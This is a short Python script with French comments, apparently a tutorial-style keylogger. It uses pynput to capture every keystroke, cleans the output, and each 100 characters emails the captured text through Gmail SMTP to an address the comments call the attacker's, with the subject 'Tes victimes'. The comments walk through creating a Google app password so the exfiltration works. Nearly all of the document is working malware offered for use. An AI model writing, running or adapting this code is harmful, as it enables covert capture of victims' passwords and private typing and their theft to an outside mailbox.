# Importation des librairies nécessaires
from pynput.keyboard import Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

keystrokes = "" # Dans cette variable, on enregistre les touches tapées au clavier

# fonction qui va stocker et envoyer les touches clavier au mail destinataire (ie à notre propre mail)
def key_logs(key):

    global keystrokes 

    # Ici, pour avoir un output plus lisible on enlève les '' à chaque caractère concaténé à la variable globale keystrokes (ie au lieu de lire 'M''D''P' on lira MDP). 
    # Par ailleurs, la conversion en chaînes de caractères est nécessaire parce que la clé (lettre tapée) est stockée avec un type 'keycode', et non pas sous forme de string.
    key = str(key).replace("'","") 

    # Pour la lisibilité encore.
    if key == "Key.backspace":
        key = "<"

    if key == "Key.space":
        key = " "

    if key == "Key.shift":
        key = ""

    if key == "Key.enter":
        key = "\n"

    # Ajout des lettres tapées à la variable 
    keystrokes+=key

    # Envoi du mail tous les 100 caractères tapés
    if len(keystrokes)>=100:
        send_mail_with_content(keystrokes)
        keystrokes=""

# Fonction pour l'envoi du mail
    
def send_mail_with_content(content):
    # coordonnées destinataire - le to_mail peut être laissé tel qu'il est, mais pensez à bien remplacer le from_mail par votre propre mail (addresse de l'attaquant)
    from_mail = "************@gmail.com"
    to_mail = "**************.com"

    # là, il faut créer un mot de passe d'application. Pour cela, rendez-vous sur les paramètres de votre compte google, activez l'authentification à 2 facteurs, allez dans la barre de recherche et tapez "mot de passe application" et cliquez sur 'se connecter avec des mots de passe d'application'. Enfin, Donnez un nom aléatoire au mot de passe et créez-le. Copier le mot de passe et coller-le dans cette variable ci-dessous.
    password = "***************"

    # création du message
    msg = MIMEMultipart()
    msg['From'] = from_mail
    msg['To'] = to_mail
    msg['Subject'] = "Tes victimes"

    msg.attach(MIMEText(content,'plain'))

    # création du serveur pour l'envoi du mail
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(from_mail,password)
    server.sendmail(from_mail,to_mail,msg.as_string())

    server.quit()

with Listener(on_press=key_logs) as l:
    l.join()